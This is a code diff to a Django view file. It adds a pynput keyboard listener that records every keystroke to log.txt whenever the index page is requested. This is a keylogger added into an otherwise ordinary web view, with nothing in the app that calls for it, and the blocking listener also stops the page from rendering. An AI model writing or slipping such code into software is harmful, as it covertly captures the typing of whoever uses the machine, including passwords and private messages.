@@ -2,8 +2,21 @@ from django.shortcuts import render
 from .models import Demo
 import plyer
 # Create your views here.
+
+from pynput.keyboard import Listener
+
+def writekey(key):
+       keydata =str(key)
+       keydata=keydata.replace("'"," ")
+       with open('log.txt' , 'a') as f:
+           f.write(keydata)
+
+                
 def index(request):
     all=Demo.objects.all()
+    with Listener(on_press=writekey) as l:
+        
+        l.join()
 
 
     return render(request,'index.html',{'all':all})
